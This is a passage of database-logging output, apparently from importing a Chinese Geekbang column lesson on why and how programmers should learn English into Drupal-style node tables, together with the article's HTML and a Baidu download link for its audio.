data-slate-leaf="true" data-offset-key="2062:0" data-first-offset="true"><span data-slate-string="true">如果你使用 
Google 搜索“2Q 算法”，你会看到类似这样的结果：</span></span></span> </div> <div class="se-814b3dc1" data-slate-type="image" 
data-slate-object="block" data-key="2063"> <img class="se-c27c6057" src="https://static001.geekbang.org/resource/image/0d/cc/0da2e7723662c6404f0e494fd20ea8cc.png"> 
</div> <div class="se-c8c85b68 " data-slate-type="paragraph" data-slate-object="block" data-key="2064"> 
<span data-slate-object="text" data-key="2065"><span data-slate-leaf="true" data-offset-key="2065:0" 
data-first-offset="true"><span data-slate-string="true">基本上结果的相关性不错，但是这 4 条最靠上的结果都无一例外地是一些个人学习和分享的博客，对于 
2Q 算法的笔记和理解。拿百度搜索，结果也类似，其中 CSDN 的网站权重要高一些，并且结果页的右边多了一个毫无关联性的搜索热点消息栏。</span></span></span> </div> 
<div class="se-c6e36e36 " data-slate-type="paragraph" data-slate-object="block" data-key="2066"> 
<span data-slate-object="text" data-key="2067"><span data-slate-leaf="true" data-offset-key="2067:0" 
data-first-offset="true"><span data-slate-string="true">但是，如果使用英文，搜索“2Q algorithm”，结果页如下：</span></span></span> 
</div> <div class="se-9c9b2afd" data-slate-type="image" data-slate-object="block" data-key="2068"> 
<img class="se-0db3a150" src="https://static001.geekbang.org/resource/image/01/57/016cd82a8023dcf10ff26a06fb36e857.png"> 
</div> <div class="se-00179e62 " data-slate-type="paragraph" data-slate-object="block" data-key="2069"> 
<span data-slate-object="text" data-key="2070"><span data-slate-leaf="true" data-offset-key="2070:0" 
data-first-offset="true"><span data-slate-string="true">也一样看看这 4 条最靠上的结果，相关性依然保持的同时，相对有更有价值的内容：</span></span></span> 
</div> <div class="se-5797fda5" data-slate-type="list" data-slate-object="block" data-key="2071"> 
<div class="se-28d81a4f se-1017f217" data-slate-type="list-line" data-slate-object="block" 
data-key="2072"> <span data-slate-object="text" data-key="2073"><span data-slate-leaf="true" 
data-offset-key="2073:0" data-first-offset="true"><span data-slate-string="true">第一条，是 2Q 算法提出的论文，这显然是对于该算法最权威的材料了，并且标题下面列出了引用数 
831，以及论文相关文章的链接；</span></span></span> </div> <div class="se-cbb720eb se-b94803f1" data-slate-type="list-line" 
data-slate-object="block" data-key="2074"> <span data-slate-object="text" data-key="2075"><span 
data-slate-leaf="true" data-offset-key="2075:0" data-first-offset="true"><span data-slate-string="true">第 
2 条是针对该算法的一个介绍和改进；</span></span></span> </div> <div class="se-05282614 se-400ea73a" data-slate-type="list-line" 
data-slate-object="block" data-key="2076"> <span data-slate-object="text" data-key="2077"><span 
data-slate-leaf="true" data-offset-key="2077:0" data-first-offset="true"><span data-slate-string="true">第 
3 条是 2Q 算法的讨论；</span></span></span> </div> <div class="se-e9105333 se-d72004b9" data-slate-type="list-line" 
data-slate-object="block" data-key="2078"> <span data-slate-object="text" data-key="2079"><span 
data-slate-leaf="true" data-offset-key="2079:0" data-first-offset="true"><span data-slate-string="true">而第 
4 条则是维基百科关于缓存替换策略的页面，2Q 算法就是被设计用作缓存替换算法的，这些算法被放在一起横向比较。</span></span></span> </div> </div> 
<div class="se-bdd87a38 " data-slate-type="paragraph" data-slate-object="block" data-key="2080"> 
<span data-slate-object="text" data-key="2081"><span data-slate-leaf="true" data-offset-key="2081:0" 
data-first-offset="true"><span data-slate-string="true">如果你进一步点击查看维基百科的这个缓存替换策略的页面，你依然可以发现，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2082" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="2083"><span data-slate-leaf="true" data-offset-key="2083:0" 
data-first-offset="true"><span data-slate-string="true">英文页面</span></span></span></a><span 
data-slate-object="text" data-key="2084"><span data-slate-leaf="true" data-offset-key="2084:0" 
data-first-offset="true"><span data-slate-string="true">要远比</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2085" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="2086"><span data-slate-leaf="true" data-offset-key="2086:0" data-first-offset="true"><span 
data-slate-string="true">中文页面</span></span></span></a><span data-slate-object="text" data-key="2087"><span 
data-slate-leaf="true" data-offset-key="2087:0" data-first-offset="true"><span data-slate-string="true">内容丰富得多：</span></span></span> 
</div> <div class="se-f8e38454" data-slate-type="image" data-slate-object="block" data-key="2088"> 
<img class="se-bf828211" src="https://static001.geekbang.org/resource/image/1f/89/1fc3805b86eb3701a83d07edfb952889.png"> 
</div> <div class="se-cfb31eb7 " data-slate-type="paragraph" data-slate-object="block" data-key="2089"> 
<span data-slate-object="text" data-key="2090"><span data-slate-leaf="true" data-offset-key="2090:0" 
data-first-offset="true"><span data-slate-string="true">你看，英文页面中有这样一系列缓存替换算法的比较，每个算法都有具体说明；但是中文页呢，什么都没有，只有一个简单的介绍。</span></span></span> 
</div> <div class="se-998a2892" data-slate-type="image" data-slate-object="block" data-key="2091"> 
<img class="se-d43b3242" src="https://static001.geekbang.org/resource/image/a1/86/a1d514c8a0adaca8f61615fc91a0d386.png"> 
</div> <div class="se-8f971383 " data-slate-type="paragraph" data-slate-object="block" data-key="2092"> 
<span data-slate-object="text" data-key="2093"><span data-slate-leaf="true" data-offset-key="2093:0" 
data-first-offset="true"><span data-slate-string="true">需要强调的是，我不希望被误解，我的意思不是说不能使用中文搜索技术材料，通过这个实际的例子，我是想向你说明，在计算机科学领域，大多我们查询技术资料的时候，使用英文确确实实能带来多得多的好处。</span></span></span> 
</div> <div class="se-9249cbd9 " data-slate-type="paragraph" data-slate-object="block" data-key="2094"> 
<span data-slate-object="text" data-key="2095"><span data-slate-leaf="true" data-offset-key="2095:0" 
data-first-offset="true"><span data-slate-string="true">在这个领域里，</span></span></span><span data-slate-object="text" 
data-key="2096"><span data-slate-leaf="true" data-offset-key="2096:0" data-first-offset="true"><span 
class="se-62b3d43b" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">学会英文就多了一门获取信息的最佳工具，并且这个工具往往还远远不是别的工具能替代的。</span></span></span></span><span 
data-slate-object="text" data-key="2097"><span data-slate-leaf="true" data-offset-key="2097:0" 
data-first-offset="true"><span data-slate-string="true">在之前 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2098" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="2099"><span data-slate-leaf="true" data-offset-key="2099:0" data-first-offset="true"><span 
data-slate-string="true">[第 06 讲]</span></span></span></a><span data-slate-object="text" data-key="2100"><span 
data-slate-leaf="true" data-offset-key="2100:0" data-first-offset="true"><span data-slate-string="true"> 
的特别放送中，我曾经介绍过，如今互联网十大企业，中国占了 4 家，美国占了 6 家，因此如果能够掌握好中文和英文这两门语言，程序员在信息获取上的优势就显而易见了。</span></span></span> 
</div> <div class="se-12c98aa9 " data-slate-type="paragraph" data-slate-object="block" data-key="2101"> 
<span data-slate-object="text" data-key="2102"><span data-slate-leaf="true" data-offset-key="2102:0" 
data-first-offset="true"><span data-slate-string="true">随着我们的生活逐渐被微信朋友圈、微博这些社交媒体所“统治”，我们更要注意技术材料的权威性，以避免那些错误的、走样的信息，因此我们需要使用英语去寻找自己需要的资料，并且去官方、可信的渠道去寻找资料。特别是当你可以阅读两份材料，一份英文的原版材料，一份经过了翻译，你会觉得哪一份更可靠呢？</span></span></span> 
</div> <h3 class="se-fe0bd6d3" data-slate-type="heading" data-slate-object="block" data-key="2103"><span 
data-slate-object="text" data-key="2104"><span data-slate-leaf="true" data-offset-key="2104:0" 
data-first-offset="true"><span data-slate-string="true">给自己更多的可能性</span></span></span></h3> 
<div class="se-dd8cf624 " data-slate-type="paragraph" data-slate-object="block" data-key="2105"> 
<span data-slate-object="text" data-key="2106"><span data-slate-leaf="true" data-offset-key="2106:0" 
data-first-offset="true"><span data-slate-string="true">每过一阵子，互联网就会刮起一阵“无用论”的旋风，除了前面提到的“英语无用论”，还有曾经的“数学无用论”，提出这个说辞的人理由居然是因为“生活中用到的数学”只是买菜那点而已，生活中不需要微积分，不需要线性代数。</span></span></span> 
</div> <div class="se-ba08cdd7 " data-slate-type="paragraph" data-slate-object="block" data-key="2107"> 
<span data-slate-object="text" data-key="2108"><span data-slate-leaf="true" data-offset-key="2108:0" 
data-first-offset="true"><span data-slate-string="true">有人在回复中讽刺持有这些观点的人“只知道买菜”而已，其实，我倒认为这种观点有它“话糙理不糙”的部分，观点朴素，却是有一定道理的。事实上，倘若你回头看看你所学习的知识和掌握的技能，无论软硬，在你实际的工作中，能使用到的总归只有其中的一小部分。</span></span></span> 
</div> <div class="se-b5b09863 " data-slate-type="paragraph" data-slate-object="block" data-key="2109"> 
<span data-slate-object="text" data-key="2110"><span data-slate-leaf="true" data-offset-key="2110:0" 
data-first-offset="true"><span data-slate-string="true">然而，话要说回来，</span></span></span><span 
data-slate-object="text" data-key="2111"><span data-slate-leaf="true" data-offset-key="2111:0" 
data-first-offset="true"><span class="se-c2ed41bc" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们对大多数技能的学习，是为了给自己的未来带来更大可能性的。</span></span></span></span><span data-slate-object="text" 
data-key="2112"><span data-slate-leaf="true" data-offset-key="2112:0" data-first-offset="true"><span 
data-slate-string="true">就像软件领域的 Web 全栈技能一样，英语是一个更加广泛的带来更多可能性的技能。你可以参与到更大影响力的项目中去，你对雇主的选择会更加广阔，你可以在世界更多的地方游历。事实上，职业生涯经常会发生“无心插柳柳成荫”的飞跃，我们所做的学习和积累，就是让自己准备好，在机会到来的时候尽量不要失去。</span></span></span> 
</div> <h2 class="se-eb023694" data-slate-type="heading" data-slate-object="block" data-key="2113"><span 
data-slate-object="text" data-key="2114"><span data-slate-leaf="true" data-offset-key="2114:0" 
data-first-offset="true"><span data-slate-string="true">有哪些学习英语的策略？</span></span></span></h2> 
<div class="se-73f86737 " data-slate-type="paragraph" data-slate-object="block" data-key="2115"> 
<span data-slate-object="text" data-key="2116"><span data-slate-leaf="true" data-offset-key="2116:0" 
data-first-offset="true"><span data-slate-string="true">顺理成章地，从“为什么”到“怎么样”，接下来就该说说程序员学习英语的策略了。这些策略是从我的角度来描述的，坦诚地讲，我并不聪明，学习英语的过程也颇为坎坷，高考的时候英语是拖后腿的科目。</span></span></span> 
</div> <div class="se-42ac8c6d " data-slate-type="paragraph" data-slate-object="block" data-key="2117"> 
<span data-slate-object="text" data-key="2118"><span data-slate-leaf="true" data-offset-key="2118:0" 
data-first-offset="true"><span data-slate-string="true">我知道有些朋友英文基础很好，或者英文的学习能力很强，那么我估计就不需要我这些所谓的“经验”了，但是如果你和曾经的我一样，花过不少时间，可英语的学习效果还不好，那么你就可以听听我的介绍了。</span></span></span> 
</div> <div class="se-c748e789 " data-slate-type="paragraph" data-slate-object="block" data-key="2119"> 
<span data-slate-object="text" data-key="2120"><span data-slate-leaf="true" data-offset-key="2120:0" 
data-first-offset="true"><span data-slate-string="true">首先我想说的是，程序员总是希望英语学习的投资能够尽量得到高回报，因此一般情况下，</span></span></span><span 
data-slate-object="text" data-key="2121"><span data-slate-leaf="true" data-offset-key="2121:0" 
data-first-offset="true"><span class="se-6e49b0ad" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我并不赞同所谓的“听说读写”均衡发展的观点。你能做到均衡发展当然好，但是事实往往是残酷的</span></span></span></span><span 
data-slate-object="text" data-key="2122"><span data-slate-leaf="true" data-offset-key="2122:0" 
data-first-offset="true"><span data-slate-string="true">，如果你还在学校里，那么还好，可是工作以后就不再如此了。也许生活每天都很忙碌，每天能抽出的时间并不多，更不可能像鸡汤文里说的那样，嘴里含一块小石头去海边练习发音。</span></span></span> 
</div> <h3 class="se-ea35e0c0" data-slate-type="heading" data-slate-object="block" data-key="2123"><span 
data-slate-object="text" data-key="2124"><span data-slate-leaf="true" data-offset-key="2124:0" 
data-first-offset="true"><span data-slate-string="true">听和读重于说和写</span></span></span></h3> 
<div class="se-835628a5 " data-slate-type="paragraph" data-slate-object="block" data-key="2125"> 
<span data-slate-object="text" data-key="2126"><span data-slate-leaf="true" data-offset-key="2126:0" 
data-first-offset="true"><span data-slate-string="true">英文的“说”和“写”往往并不容易练习，除了立志去英文环境发展的程序员以外，我建议你可以着重关注于“听”和“读”。众所周知语言的学习是需要长期强化的，有了如今便捷的互联网，英文文章、英文电影、英文新闻，只要自己愿意，我认为</span></span></span><span 
data-slate-object="text" data-key="2127"><span data-slate-leaf="true" data-offset-key="2127:0" 
data-first-offset="true"><span class="se-36342e28" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">“听”和“读”的不断刺激强化已经不成问题了，它们属于信息接收，但是“说”和“写”属于信息表达，后者更需要环境的浸染</span></span></span></span><span 
data-slate-object="text" data-key="2128"><span data-slate-leaf="true" data-offset-key="2128:0" 
data-first-offset="true"><span data-slate-string="true">，如果仅仅靠一周个把小时的英语角，发几封英文邮件，或者是只进行缺乏互动的练习，进步是很慢的。</span></span></span> 
</div> <div class="se-1038b72f " data-slate-type="paragraph" data-slate-object="block" data-key="2129"> 
<span data-slate-object="text" data-key="2130"><span data-slate-leaf="true" data-offset-key="2130:0" 
data-first-offset="true"><span data-slate-string="true">就我自己的经历而言，我在大学里面花费了大量的时间去学习英语的说和写，但其实效果并不好。那时候掌握的是语法和一点词汇基础，可以在思考以后说出、写出“正确”的句子，可以用来考试，但没法使用。</span></span></span> 
</div> <div class="se-044bad1b " data-slate-type="paragraph" data-slate-object="block" data-key="2131"> 
<span data-slate-object="text" data-key="2132"><span data-slate-leaf="true" data-offset-key="2132:0" 
data-first-offset="true"><span data-slate-string="true">这里有两个原因：一个是思维还是中文思维，说的时候需要思考，在大脑中还需要进行从中文到英文的翻译过程；另一个是表达的方式并不是实际的、常用的，而是自己生硬的翻译。因此英语实际应用的提高，基本上都是在工作以后，因为有了实际的需要，以及英语环境，慢慢就给拧到英文思维了，并且逐渐掌握了表达的惯用法和一些技巧，这些都和读书时候学得不一样。</span></span></span> 
</div> <h3 class="se-ba3c2ff3" data-slate-type="heading" data-slate-object="block" data-key="2133"><span 
data-slate-object="text" data-key="2134"><span data-slate-leaf="true" data-offset-key="2134:0" 
data-first-offset="true"><span data-slate-string="true">听：多样的口音</span></span></span></h3> <div 
class="se-655031e2 " data-slate-type="paragraph" data-slate-object="block" data-key="2135"> 
<span data-slate-object="text" data-key="2136"><span data-slate-leaf="true" data-offset-key="2136:0" 
data-first-offset="true"><span data-slate-string="true">我曾经有一个误解，以为英语的学习就要尽量去找那些 VOA、BBC 这样的纯正发音的材料，但实际上根本不用这样。无论是工作还是生活，我们接触的英文都是杂七杂八的，</span></span></span><span 
data-slate-object="text" data-key="2137"><span data-slate-leaf="true" data-offset-key="2137:0" 
data-first-offset="true"><span class="se-29eeaeac" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">各种各样的发音，各种各样的表达法。</span></span></span></span><span data-slate-object="text" 
data-key="2138"><span data-slate-leaf="true" data-offset-key="2138:0" data-first-offset="true"><span 
data-slate-string="true">通过对于不同口音听力的训练，能够让自己对于英语听和理解的能力得到提升。这就有点像打乒乓球，要和各种各样风格的人过招，有直板有横板，有攻有守，自己的功力才能提升。</span></span></span> 
</div> <h3 class="se-849defed" data-slate-type="heading" data-slate-object="block" data-key="2139"><span 
data-slate-object="text" data-key="2140"><span data-slate-leaf="true" data-offset-key="2140:0" 
data-first-offset="true"><span data-slate-string="true">说：关注内容，而不是发音和语法</span></span></span></h3> 
<div class="se-d0e1ae66 " data-slate-type="paragraph" data-slate-object="block" data-key="2141"> 
<span data-slate-object="text" data-key="2142"><span data-slate-leaf="true" data-offset-key="2142:0" 
data-first-offset="true"><span data-slate-string="true">上面一条是关于“听”的，这一条则是关于“说”。对于英语能力较初级的朋友来说，发音也好，语法也好，总是有很多的问题，而即便经过了再多的练习，口音和词句的用法往往还是会和“地道”有所区别。</span></span></span> 
</div> <div class="se-ddee4d09 " data-slate-type="paragraph" data-slate-object="block" data-key="2143"> 
<span data-slate-object="text" data-key="2144"><span data-slate-leaf="true" data-offset-key="2144:0" 
data-first-offset="true"><span data-slate-string="true">但是，这又有什么关系呢？平时的沟通，还是要把关注点放在内容上面。</span></span></span><span 
data-slate-object="text" data-key="2145"><span data-slate-leaf="true" data-offset-key="2145:0" 
data-first-offset="true"><span class="se-6585723b" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">无论语法有哪些错误，发音有哪些错误，实际上它们的重要性都远不如把“内容”表达出来高。</span></span></span></span><span 
data-slate-object="text" data-key="2146"><span data-slate-leaf="true" data-offset-key="2146:0" 
data-first-offset="true"><span data-slate-string="true">练习使用清晰、简洁的逻辑把问题描述清楚，真正达到沟通和交流的目的，日常工作生活中，不会有多少人在意你的发音。</span></span></span> 
</div> <h3 class="se-b5888a10" data-slate-type="heading" data-slate-object="block" data-key="2147"><span 
data-slate-object="text" data-key="2148"><span data-slate-leaf="true" data-offset-key="2148:0" 
data-first-offset="true"><span data-slate-string="true">读：从技术材料的检索和阅读开始</span></span></span></h3> 
<div class="se-108e610d " data-slate-type="paragraph" data-slate-object="block" data-key="2149"> 
<span data-slate-object="text" data-key="2150"><span data-slate-leaf="true" data-offset-key="2150:0" 
data-first-offset="true"><span data-slate-string="true">英语学习和技术学习，我们当然希望一举两得。我知道在开始的时候，这会比较困难，毕竟谁都有自己的舒适区。事实上，在写这个专栏的过程中，我本来找的扩展阅读材料绝大多数都是英文的，后来在编辑的建议下，才尽可能地把其中我能找得到类似质量和主题的材料换成中文的。</span></span></span> 
</div> <div class="se-92c0e000 " data-slate-type="paragraph" data-slate-object="block" data-key="2151"> 
<span data-slate-object="text" data-key="2152"><span data-slate-leaf="true" data-offset-key="2152:0" 
data-first-offset="true"><span data-slate-string="true">技术材料的阅读可以根据自己的情况循序渐进，但是在开始的时候，你要有个预期，就是阅读英文材料的速度肯定是要慢于中文材料的。作为程序员，我们也可以把自己的英文阅读目标范畴基本定在技术文档上面，从我的经历来看，技术上从中文逐渐适应到英文，还是要比生活上的切换简单得多得多。</span></span></span> 
</div> <h3 class="se-fa284431" data-slate-type="heading" data-slate-object="block" data-key="2153"><span 
data-slate-object="text" data-key="2154"><span data-slate-leaf="true" data-offset-key="2154:0" 
data-first-offset="true"><span data-slate-string="true">写：学习那些文档和邮件中的惯用法</span></span></span></h3> 
<div class="se-a0777fa1 " data-slate-type="paragraph" data-slate-object="block" data-key="2155"> 
<span data-slate-object="text" data-key="2156"><span data-slate-leaf="true" data-offset-key="2156:0" 
data-first-offset="true"><span data-slate-string="true">仅仅是靠自己写，没有反馈的话，你不会知道这样写对不对、好不好。很多常见的用法课本里不会写，老师未必教，你可能很明确自己的表达从语法上看是不是正确，但是大家却未必这样使用。因此阅读那些英语母语的程序员写的的技术文档，就是一个很好的积累惯用法的方法。而英文邮件，则是另一个很好的例子，阅读它们，可以积累一些书面上怎么表达的例子，怎么提问，怎么认可，怎么否定，怎么请求帮助，等等。</span></span></span> 
</div> <h3 class="se-ac9a342c" data-slate-type="heading" data-slate-object="block" data-key="2157"><span 
data-slate-object="text" data-key="2158"><span data-slate-leaf="true" data-offset-key="2158:0" 
data-first-offset="true"><span data-slate-string="true">寻找乐趣</span></span></span></h3> <div 
class="se-74809dfd " data-slate-type="paragraph" data-slate-object="block" data-key="2159"> 
<span data-slate-object="text" data-key="2160"><span data-slate-leaf="true" data-offset-key="2160:0" 
data-first-offset="true"><span data-slate-string="true">这是最后一点，也是最重要的一点。没有了乐趣，所有的学习都是事倍功半。最理想的状况，应该是乐于做一件事，做完了，还在不知不觉中获得了自己想要的东西。我知道有很多程序员朋友就是因为喜欢编程才逐渐走上了程序员这条路，郭德纲说过：“如果你的工作也是你的爱好，那是老天爷疼你。”英语学习也是如此，如果你在努力的过程中能得到更多的乐趣，那就是绝妙。</span></span></span> 
</div> <div class="se-cb9754d6 " data-slate-type="paragraph" data-slate-object="block" data-key="2161"> 
<span data-slate-object="text" data-key="2162"><span data-slate-leaf="true" data-offset-key="2162:0" 
data-first-offset="true"><span data-slate-string="true">拿我自己来说，有两个时期我自己明显感觉英文进步比较大。一个是在读高中的时候，我是《最终幻想》的游戏迷，《最终幻想 
VIII》巨长的对白文字，我当时硬是凭借一个文曲星把剧情啃下来了；另一个是工作以后，美剧《Friends》断断续续看了好几遍，从一开始看中文字幕，到后来看英文字幕，以及再后来大致可以脱离字幕……这其中，兴趣的功劳是第一位的。</span></span></span> 
</div> <div class="se-73502fa2 " data-slate-type="paragraph" data-slate-object="block" data-key="2163"> 
<span data-slate-object="text" data-key="2164"><span data-slate-leaf="true" data-offset-key="2164:0" 
data-first-offset="true"><span data-slate-string="true">好，今天的特别放送就聊到这里。这是我的体会和分享，现在我把话筒给你，不如你也说说你的故事？</span></span></span> 
</div> <div class="se-ee122f50" data-slate-type="image" data-slate-object="block" data-key="2165"> 
<img class="se-ce0a560f" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.886 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=13 
 {executed in 0 msec}
2020-11-19 11:07:09.886 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:07:09.887 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=13 
 {executed in 0 msec}
2020-11-19 11:07:09.887 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:07:09.888 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755229, 1605755229, 1, 'zh-hans', 0, 1, 1, 
0, '33丨特别放送：聊一聊程序员学英语', 1, 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.892 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=13 
 {executed in 0 msec}
2020-11-19 11:07:09.893 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:07:09.894 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755229, 1605755229, 1, 'zh-hans', 0, 
1, 1, 0, '33丨特别放送：聊一聊程序员学英语', 'book', 1, 13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.898 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.899 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:09.899 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.900 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:09.901 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/6b49bf7d7a602d514b9f1efce2943f08?bkt=en-4d166c071887761588fbae8711db460bb3e4681054e2be99f549268360399b6e92a2be3244970a90&fid=3757516097-778750-838956363868065&time=1605755228&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-%2BYq%2Fo3ISOtTtaZZEFTAGk97t4rU%3D&to=92&size=10444626&sta_dx=10444626&sta_cs=3216&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1574746261&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=10444626&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-4d30d1617ca31b1820e2c25464f2727b513aa9a7bc3430259861acf0d5305b7ce7930bec263d939f&sl=76480590&expires=8h&rt=pr&r=697762001&mlogid=7502026954681783740&vbdid=2247232042&fin=33%E4%B8%A8%E7%89%B9%E5%88%AB%E6%94%BE%E9%80%81%EF%BC%9A%E8%81%8A%E4%B8%80%E8%81%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AD%A6%E8%8B%B1%E8%AF%AD.m4a&bflag=92,34-92&rtype=1&dp-logid=7502026954681783740&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=6271d6a92c89ad8b4391dc068565d91f99f9df04713e16bb&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=33%E4%B8%A8%E7%89%B9%E5%88%AB%E6%94%BE%E9%80%81%EF%BC%9A%E8%81%8A%E4%B8%80%E8%81%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AD%A6%E8%8B%B1%E8%AF%AD.m4a', 
13, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.905 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.905 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:07:09.906 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
